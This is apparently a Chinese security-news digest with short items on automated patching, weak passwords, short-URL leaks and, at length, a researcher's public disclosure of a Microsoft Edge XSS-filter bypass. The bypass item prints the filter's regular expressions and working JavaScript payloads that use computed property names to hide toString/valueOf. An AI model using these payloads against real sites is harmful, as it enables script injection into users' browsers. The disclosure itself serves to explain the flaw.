下图为漏洞发现时间到修补时间的分布图，可以看到传统人工防御机制大约需要24天来应对新产生的攻击。因此若能自动化产生防御机制，便能大幅降低攻击和防御手法间的时间差，保护更多的信息系统。
=700) window.open('http://image.3001.net/images/20160420/14611354354215.png!small')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >



-----------------------------------------------------------22-----------------------------------------------------------
0X22: 
     [04.21]安全科普：浅谈弱口令的危害 

故事要从一次艰难的渗透测试说起（以下案例均为授权测试），实践证明，要想进行一次完美的渗透，网站漏洞跟弱口令更配！
=700) window.open('http://image.3001.net/images/20160412/14604676306859.png!small')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >



-----------------------------------------------------------23-----------------------------------------------------------
0X23: 
     [04.21]短网址服务可能泄露你的敏感信息 

=700) window.open('http://image.3001.net/images/20160418/14609383421086.png!small')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >



-----------------------------------------------------------24-----------------------------------------------------------
0X24: 
     [04.21]如何绕过Edge XSS过滤器？ 

作者曾经在2015年9月向微软提交了这个bug，但是微软至今也没有修复这个问题。考虑到离提交报告已经过去了很长时间，于是作者决定在他的博客中公开这个问题。
过去 IE 有一个缺陷，你可以使用位置对象作为一个函数，并结合 toString/valueOf 按照对象的字面意义来执行代码。基本上你可以使用对象的字面意义作为一个伪数组然后调用 join 函数构造成字符串，随后将依次其传递给 valueOf 和位置对象。下面是代码：
-{toString:[].join,length:1,0:'javascript:alert(123)',valueOf:location}这在最新版的 Edge 上同样有用，但是浏览器会检测到 XSS 攻击。XSS 过滤器的正则表达式检测到一个字符串后面跟随若干包含 “{” 或 “,”的字符以及 toString/valueOf 和冒号。valueOf 中的字符 “a” 和 toString 中的字符 “o” 会被替换为 “#”。下面是一个简化版的正则表达式：
[&quot'`].*?[{,].*(valueOf|toString).*?:}下面是2015年10月份的Edge XSS 过滤正则表达式。
{&lta.*?hr{e}f}{[\&quot\'`][ ]*(([^a-z0-9~_:\'\&quot` ])|(in)).+?{[\(`]}.*?{[\)`]}}{[\&quot\'`].*?[{,].*(((v|(\\u0076)|(\\u[{]0*76[}])|(\\166)|(\\x76))[^a-z0-9]*({a}|(\\u00{6}1)|(\\u[{]0*{6}1[}])|(\\1{4}1)|(\\x{6}1))[^a-z0-9]*(l|(\\u006C)|(\\u[{]0*6C[}])|(\\154)|(\\x6C))[^a-z0-9]*(u|(\\u0075)|(\\u[{]0*75[}])|(\\165)|(\\x75))[^a-z0-9]*(e|(\\u0065)|(\\u[{]0*65[}])|(\\145)|(\\x65))[^a-z0-9]*(O|(\\u004F)|(\\u[{]0*4F[}])|(\\117)|(\\x4F))[^a-z0-9]*(f|(\\u0066)|(\\u[{]0*66[}])|(\\146)|(\\x66)))|((t|(\\u0074)|(\\u[{]0*74[}])|(\\164)|(\\x74))[^a-z0-9]*({o}|(\\u00{6}F)|(\\u[{]0*{6}F[}])|(\\1{5}7)|(\\x{6}F))[^a-z0-9]*(S|(\\u0053)|(\\u[{]0*53[}])|(\\123)|(\\x53))[^a-z0-9]*(t|(\\u0074)|(\\u[{]0*74[}])|(\\164)|(\\x74))[^a-z0-9]*(r|(\\u0072)|(\\u[{]0*72[}])|(\\162)|(\\x72))[^a-z0-9]*(i|(\\u0069)|(\\u[{]0*69[}])|(\\151)|(\\x69))[^a-z0-9]*(n|(\\u006E)|(\\u[{]0*6E[}])|(\\156)|(\\x6E))[^a-z0-9]*(g|(\\u0067)|(\\u[{]0*67[}])|(\\147)|(\\x67)))).*?:}{&ltfo{r}m.*?&gt}{&ltsc{r}ipt.*?[ /+\t]*?((src)|(xlink:href)|(href))[ /+\t]*=}{&ltTEXTA{R}EA[ /+\t&gt]}{&ltOPTION[ /+\t].*?va{l}ue[ /+\t]*=}{&ltINPUT[ /+\t].*?va{l}ue[ /+\t]*=}{&ltBUTTON[ /+\t].*?va{l}ue[ /+\t]*=}{[\&quot\'`][ ]*(([^a-z0-9~_:\'\&quot` ])|(in)).+?{[\[]}.*?{[\]]}.*?=}{[\&quot\'`][ ]*(([^a-z0-9~_:\'\&quot` ])|(in)).+?{[.]}.+?=}{[\&quot\'`].*?{[\)`]}[ ]*(([^a-z0-9~_:\'\&quot` ])|(in)).+?{[\(`]}}{&ltsc{r}ipt.*?&gt}{[\&quot\'`][ ]*(([^a-z0-9~_:\'\&quot` ])|(in)).*?(((l|(\\u006[Cc])|(\\u[{]0*6[Cc][}]))(o|(\\u006[Ff])|(\\u[{]0*6[Ff][}]))({c}|(\\u00{6}3)|(\\u[{]0*{6}3[}]))(a|(\\u0061)|(\\u[{]0*61[}]))(t|(\\u0074)|(\\u[{]0*74[}]))(i|(\\u0069)|(\\u[{]0*69[}]))(o|(\\u006[Ff])|(\\u[{]0*6[Ff][}]))(n|(\\u006[Ee])|(\\u[{]0*6[Ee][}])))|((n|(\\u006[Ee])|(\\u[{]0*6[Ee][}]))(a|(\\u0061)|(\\u[{]0*61[}]))({m}|(\\u00{6}[Dd])|(\\u[{]0*{6}[Dd][}]))(e|(\\u0065)|(\\u[{]0*65[}])))|((o|(\\u006[Ff])|(\\u[{]0*6[Ff][}]))(n|(\\u006[Ee])|(\\u[{]0*6[Ee][}]))({e}|(\\u00{6}5)|(\\u[{]0*{6}5[}]))(r|(\\u0072)|(\\u[{]0*72[}]))(r|(\\u0072)|(\\u[{]0*72[}]))(o|(\\u006[Ff])|(\\u[{]0*6[Ff][}]))(r|(\\u0072)|(\\u[{]0*72[}])))|((v|(\\u0076)|(\\u[{]0*76[}]))(a|(\\u0061)|(\\u[{]0*61[}]))({l}|(\\u00{6}[Cc])|(\\u[{]0*{6}[Cc][}]))(u|(\\u0075)|(\\u[{]0*75[}]))(e|(\\u0065)|(\\u[{]0*65[}]))(O|(\\u004[Ff])|(\\u[{]0*6[Ff][}]))(f|(\\u0066)|(\\u[{]0*66[}])))).*?=}{&ltAP{P}LET[ /+\t&gt]}{[ /+\t\&quot\'`]data{s}rc[ +\t]*?=.}{&ltBA{S}E[ /+\t].*?href[ /+\t]*=}{&ltLI{N}K[ /+\t].*?href[ /+\t]*=}{&ltst{y}le.*?&gt.*?((@[i\\])|(([:=]|(&amp#x?0*((58)|(3A)|(61)|(3D))?)).*?([(\\]|(&amp#x?0*((40)|(28)|(92)|(5C))?))))}{[ /+\t\&quot\'`]st{y}le[ /+\t]*?=.*?([:=]|(&amp#x?0*((58)|(3A)|(61)|(3D))?)).*?([(\\]|(&amp#x?0*((40)|(28)|(92)|(5C))?))}{&ltOB{J}ECT[ /+\t].*?((type)|(codetype)|(classid)|(code)|(data))[ /+\t]*=}{[ /+\t\&quot\'`]{o}n\c\c\c+?[ +\t]*?=.}{&lt.*[:]vmlf{r}ame.*?[ /+\t]*?src[ /+\t]*=}{&lt?f{r}ame.*?[ /+\t]*?src[ /+\t]*=}{&ltis{i}ndex[ /+\t&gt]}{&ltME{T}A[ /+\t].*?((http-equiv)|(charset))[ /+\t]*=}{&lt[?]?im{p}ort[ /+\t].*?implementation[ /+\t]*=}{&ltEM{B}ED[ /+\t].*?((src)|(type)).*?=}{(v|(&amp#x?0*((86)|(56)|(118)|(76))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*{(b|(&amp#x?0*((66)|(42)|(98)|(62))?))}([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*(s|(&amp#x?0*((83)|(53)|(115)|(73))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*((c|(&amp#x?0*((67)|(43)|(99)|(63))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*(r|(&amp#x?0*((82)|(52)|(114)|(72))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*(i|(&amp#x?0*((73)|(49)|(105)|(69))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*(p|(&amp#x?0*((80)|(50)|(112)|(70))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*(t|(&amp#x?0*((84)|(54)|(116)|(74))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*)?(:|(&amp((#x?0*((58)|(3A))?)|(colon)))).}{(j|(&amp#x?0*((74)|(4A)|(106)|(6A))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*(a|(&amp#x?0*((65)|(41)|(97)|(61))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*(v|(&amp#x?0*((86)|(56)|(118)|(76))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*(a|(&amp#x?0*((65)|(41)|(97)|(61))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*(s|(&amp#x?0*((83)|(53)|(115)|(73))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*(c|(&amp#x?0*((67)|(43)|(99)|(63))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*{(r|(&amp#x?0*((82)|(52)|(114)|(72))?))}([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*(i|(&amp#x?0*((73)|(49)|(105)|(69))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*(p|(&amp#x?0*((80)|(50)|(112)|(70))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*(t|(&amp#x?0*((84)|(54)|(116)|(74))?))([\t]|(&amp((#x?0*(9|(13)|(10)|A|D)?)|(tab)|(newline))))*(:|(&amp((#x?0*((58)|(3A))?)|(colon)))).}目前 Edge 已经支持 ES6 并且有了一些非常有用的新功能。但 ES6 的计算特性允许你通过一个表达式来计算属性的名称，例如：
x='a'o={[x]:123}alert(o.a)至此我想你应该知道要怎么办了吧。通过将这两种技术结合就可以绕过 Edge XSS 过滤器。之前说过正则表达式会匹配 toString/valueOf，但不幸的是我们可以利用计算特性来混淆它们。
x='g',y='f',{['toStrin'+x]:[].join,length:1,0:'java\script:alert\x28123\x29',['valueO'+y]:location}-''




